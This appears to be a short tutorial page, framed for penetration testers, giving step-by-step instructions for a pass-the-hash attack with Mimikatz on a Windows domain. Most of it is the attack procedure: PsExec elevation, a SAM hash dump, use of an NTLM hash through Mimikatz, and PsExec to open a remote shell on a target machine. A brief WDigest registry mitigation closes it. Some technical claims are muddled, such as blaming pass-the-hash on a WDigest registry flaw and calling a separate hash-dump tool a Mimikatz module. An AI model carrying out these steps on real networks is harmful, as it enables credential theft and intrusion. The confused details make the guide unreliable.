# Pass the Hash Attack - by Shay Crane<br></br>


## What Is Mimikatz?
Mimikatz is an open source post-exploitation tool, used by pen testers and hackers alike.  Mimikatz facilitates stealth lateral movement through a given network.  This is made possible through the Mimikatz modules that can be used to view and save credentials, which can then be used to start a remote shell session on another machine on the network.<br></br>   

## Pass The Hash Attack
The Pass The Hash attack technique works by exploiting a vulnerability in the registry (WDigest).  The Administrator's password hash from a computer on the target network is accessed, then that hash is used to authenticate access into another network computer. The hash does not even need to be cracked.  The target computer will accept it as is.  Once the target computer is accessed using this hash, the pen tester can deposit the payload to it or create a new user with escalated permissions. <br></br> 


## How to Perform a Pass The Hash Attack

Before this attack can succeed, the following conditions must be met: 

- Access to a pc on the target network (pc1).
- PC1 must use Windows and be on the same network as the pc you will use to move laterally through the network (pc2)
- The network must be administered by a Windows Domain Controller. 
- Mimikatz deposited on the first accessed pc
- IP address of target machine you will laterally move to
<br></br> 

Once the above conditions are met, peform the following steps (screenshots to be inserted soon):

1. Open a terminal session on PC1 as Administrator, then elevate access to the "shadow" system administrator account using the following command script:  
***PsExec -s -d -i cmd.exe***
This will open a new and differently colored terminal window, indicating success. 

[SCREENSHOT OF SHADOW ADMIN TERMINAL]<br></br> 

2. Perform a hash dump on this computer:
   - Navigate to the mimikatz directory 
   - Execute CQHashDumpv2 from your Mimikatz modules and direct the data to be dumped into a new text file. This can be done with this command: ***CQHashDumpv2.exe /samdump > C:\Users\[username]\Desktop\[name-of-your-text-file].txt***<br></br> 



3. Open the text file you just created on the PC1 desktop and copy the hash of the (regular) Administrator password from within it.
<br></br> 
Then go back to the regular Administrator terminal session and navigate to the Mimikatz directory and then from there to either the x64 or x32 folder, depending on the target. 

[SCREENSHOT]

4. Execute Mimikatz:  mimikatz.exe

5. Without changing your directory location, verify your level of access using the sekurlsa::pth module in mimikatz: ***privilege::debug***<br></br> 
Output of "Privilege '20' OK" means you were successful.<br></br> 
6. If step 5 is successful, enter the following command in the same terminal session: /user:Administrator /domain:localhost /ntlm:[YOUR COPIED ADMIN HASH FROM STEP 4.]<br></br> 


7. Run this command:  <br>***PsExec.exe \\[IP ADDRESS OF TARGET MACHINE] cmd.exe***<br></br> 

YOU'RE IN. <br></br> 
## Wrap Up

You can verify that you have established a remote shell session on the target PC by running the command ***hostname*** or ***whoami*** <br></br> 
Using the shell session, navigate to whatever user account in the directory is appropriate for your test. <br></br> 
From here, the payload can be delivered and the test attack can be performed. <br></br>


## Final Thoughts

This is a fairly easy attack for a pen tester to pull off, and therefore easy for a hacker.  The only trick is how you will initiate access to a computer on the target network. 

In conclusion, this is an easily exploited vulnerability on Windows that all pen testers should check for, as any organization running desktops with this vulnerability should mitigate it asap. 

Closing this vulnerability is easily done by changing an entry in the registry: <br>
- The ***UseLogonCredential*** value within the WDigest HKEY should be set to 0.  
- If it's set to 1 when you run your audit, your network has been vulnerable and you or your sysadmin should run a scan on the network to ensure the vulnerability has not already been exploited. 
